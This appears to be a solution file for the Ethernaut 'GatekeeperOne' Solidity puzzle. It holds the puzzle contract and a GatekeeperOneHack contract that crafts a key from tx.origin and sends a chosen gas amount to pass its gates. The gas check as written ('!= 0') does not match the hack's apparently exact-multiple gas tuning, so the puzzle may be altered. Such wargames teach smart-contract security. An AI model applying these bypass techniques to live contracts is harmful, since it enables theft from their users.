// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin, "GatekeeperOne: invalid gateOne");
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 != 0, "GatekeeperOne: invalid gateTwo");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GatekeeperOneHack {
    function hack(address gatekeeperOneAddress) external {
        uint64 gateKey = uint64(0x0100000000000000) + uint16(uint160(tx.origin));
        GatekeeperOne(gatekeeperOneAddress).enter{gas: 40955}(bytes8(gateKey));
    }
}